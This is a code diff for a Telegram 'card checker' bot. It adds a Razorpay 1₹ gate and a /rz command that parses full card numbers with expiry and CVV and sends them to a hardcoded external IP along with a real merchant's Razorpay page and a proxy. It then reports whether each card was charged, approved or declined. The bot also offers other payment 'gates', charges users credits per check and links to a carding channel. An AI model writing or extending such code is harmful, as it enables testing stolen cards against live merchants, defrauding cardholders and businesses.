@@ -643,8 +643,11 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             InlineKeyboardButton("💳 Adyen 1$", callback_data="adyen_gate")  
         ],
         [
-            InlineKeyboardButton("💰 PayPal 1$", callback_data="paypal1_gate"),  # ✅ New button            
+            InlineKeyboardButton("💰 PayPal 1$", callback_data="paypal1_gate"),
             InlineKeyboardButton("💰 PayPal Payments 9$", callback_data="paypal_gate")
+        ],
+        [
+            InlineKeyboardButton("⚡ Razorpay 1₹", callback_data="razorpay1_gate")  # ✅ Added Razorpay button
         ],
         [
             InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")
@@ -667,6 +670,42 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
         )
 
 
+
+async def razorpay_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the 'Razorpay 1₹' button."""
+    q = update.callback_query
+    await q.answer()
+
+    BULLET_GROUP_LINK = "https://t.me/CARDER33"  # your clickable bullet link
+    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
+
+    text = (
+        "✦═══ 𝑹𝑨𝒁𝑶𝑹𝑷𝑨𝒀 1₹ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃       : <code>/rz</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬    : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲  : <i>Razorpay</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 : <i>₹1</i>\n"
+    )
+
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
+        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
+    ])
+
+    try:
+        await q.edit_message_caption(
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=keyboard
+        )
+    except Exception as e:
+        logger.warning(f"Failed to edit message, sending a new one: {e}")
+        await q.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=keyboard,
+            disable_web_page_preview=True
+        )
 
 
 
@@ -1096,7 +1135,8 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "authnet36_gate": authnet36_gate_handler,
         "ocean_gate": ocean_gate_handler,          # ✅ Ocean Payments 4$
         "adyen_gate": adyen_gate_handler,          # ✅ Added Adyen 1$
-        "paypal_gate": paypal_gate_handler, 
+        "paypal_gate": paypal_gate_handler,
+        "razorpay1_gate": razorpay_gate_handler,
         "paypal1_gate": paypal1_gate_handler,
         "ds_lookup": ds_lookup_menu_handler,
         "back_to_start": back_to_start_handler,
@@ -1146,7 +1186,7 @@ ALL_COMMANDS = [
     ("3DS Lookup", "/vbv"),
     ("Shopify Charge $0.98", "/sh"),
     ("Shopify Charge $10", "/hc"),
-    ("Visa killer", "/kill"),
+    ("Razorpay charge 1₹", "/rz"),
     ("Set your Shopify site", "/seturl"),
     ("Auto check on your site", "/sp"),
     ("Mass Shopify Charged", "/msp"),
@@ -2548,6 +2588,244 @@ async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # --- Run in background ---
     asyncio.create_task(process_st(update, context, payload))
+
+
+
+
+
+import aiohttp
+import asyncio
+import json
+import logging
+import re
+import time
+from html import escape
+from datetime import datetime
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
+from db import get_user, update_user
+from bin import get_bin_info
+
+logger = logging.getLogger(__name__)
+
+# --- User cooldowns ---
+user_cooldowns = {}
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int, amount: int = 1) -> bool:
+    """Consume `amount` credits from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) >= amount:
+        new_credits = user_data["credits"] - amount
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+# --- Razorpay Processor ---
+async def process_rz(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
+    """
+    Process a /rz command: check Razorpay 1rs charge, display response and BIN info.
+    """
+    start_time = time.time()
+    try:
+        user = update.effective_user
+
+        # --- Consume credit ---
+        if not await consume_credit(user.id):
+            await update.message.reply_text("❌ You don’t have enough credits left.")
+            return
+
+        # --- Extract card details ---
+        parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: /rz 1234567812345678|12|2028|123",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+        full_card = f"{cc}|{mm}|{yy}|{cvv}"
+
+        # --- Initial processing message ---
+        processing_text = (
+            f"<pre><code>⏳ Processing Razorpay 1₹...</code></pre>\n"
+            f"<pre><code>{escape(full_card)}</code></pre>\n"
+            f"<b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 1₹</b>\n"
+        )
+
+        processing_msg = await update.message.reply_text(
+            processing_text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+        # --- API request ---
+        api_url = (
+            f"http://168.220.237.46:5000/"
+            f"key=rz/"
+            f"proxy=proxy%20laga%20le/"
+            f"site=https://razorpay.me/@hotelparasinternationaldelhi/"
+            f"price=1/"
+            f"cc={full_card}"
+        )
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
+                    api_response = await resp.text()
+        except asyncio.TimeoutError:
+            await processing_msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
+            return
+        except Exception as e:
+            await processing_msg.edit_text(
+                f"❌ API request failed: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        # --- Parse API response ---
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            await processing_msg.edit_text(
+                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        response_description = data.get("description", "No description")
+        proxy_ip = data.get("proxy_ip", "N/A")
+        proxy_status = data.get("proxy_status", "N/A")
+        gateway_label = "Razorpay 1₹"
+
+        # --- BIN lookup ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number) or {}
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank", {}).get("name") if isinstance(bin_details.get("bank"), dict) else bin_details.get("bank", "N/A")
+            country_name = bin_details.get("country", {}).get("name") if isinstance(bin_details.get("country"), dict) else bin_details.get("country", "Unknown")
+            country_flag = bin_details.get("country_emoji", "")
+        except Exception:
+            brand = issuer = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- Determine status emoji ---
+        lower_resp = response_description.lower()
+        if re.search(r"\b(approved|charged|success)\b", lower_resp):
+            header_status = "🔥 𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
+        elif "3dsecure" in lower_resp:
+            header_status = "✅ Approved"
+        elif "declined" in lower_resp or "insufficient" in lower_resp:
+            header_status = "❌ Declined"
+        else:
+            header_status = "ℹ️ Info"
+
+        # --- Time elapsed ---
+        elapsed_time = round(time.time() - start_time, 2)
+
+        # --- Developer Branding ---
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+        # --- Requester ---
+        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
+        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
+
+        # --- Final message ---
+        final_msg = (
+            f"<b><i>{header_status}</i></b>\n\n"
+            f"𝐂𝐚𝐫𝐝\n"
+            f"⤷ <code>{escape(full_card)}</code>\n"
+            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 1₹\n"
+            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response_description)}</code></i>\n\n"
+            f"<pre>"
+            f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
+            f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
+            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}\n"
+            f"𝐏𝐫𝐨𝐱𝐲 ➵ {escape(proxy_ip)} ({escape(proxy_status)})"
+            f"</pre>\n\n"
+            f"𝐃𝐄𝐕 ➵ {developer_clickable}\n"
+            f"𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐫 ➵ {requester}\n"
+            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
+        )
+
+        await processing_msg.edit_text(
+            final_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+    except Exception as e:
+        try:
+            await update.message.reply_text(
+                f"❌ Error: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+
+# --- Regex for card extraction ---
+RZ_CARD_REGEX = re.compile(
+    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
+)
+
+# --- /rz command entry point ---
+async def rz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+
+    # --- Cooldown check ---
+    if not await enforce_cooldown(user.id, update):
+        return
+
+    card_input = None
+
+    # --- Check arguments ---
+    if context.args:
+        raw_text = " ".join(context.args).strip()
+        match = RZ_CARD_REGEX.search(raw_text)
+        if match:
+            card_input = match.groups()
+
+    # --- If no args, check reply message ---
+    elif update.message.reply_to_message and update.message.reply_to_message.text:
+        match = RZ_CARD_REGEX.search(update.message.reply_to_message.text)
+        if match:
+            card_input = match.groups()
+
+    # --- If still no payload ---
+    if not card_input:
+        await update.message.reply_text(
+            "⚠️ Usage: <code>/rz card|mm|yy|cvv</code>\n"
+            "Or reply to a message containing a card.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # --- Normalize ---
+    card, mm, yy, cvv = card_input
+    mm = mm.zfill(2)
+    yy = yy[-2:] if len(yy) == 4 else yy
+    payload = f"{card}|{mm}|{yy}|{cvv}"
+
+    # --- Run in background ---
+    asyncio.create_task(process_rz(update, context, payload))
 
 
 
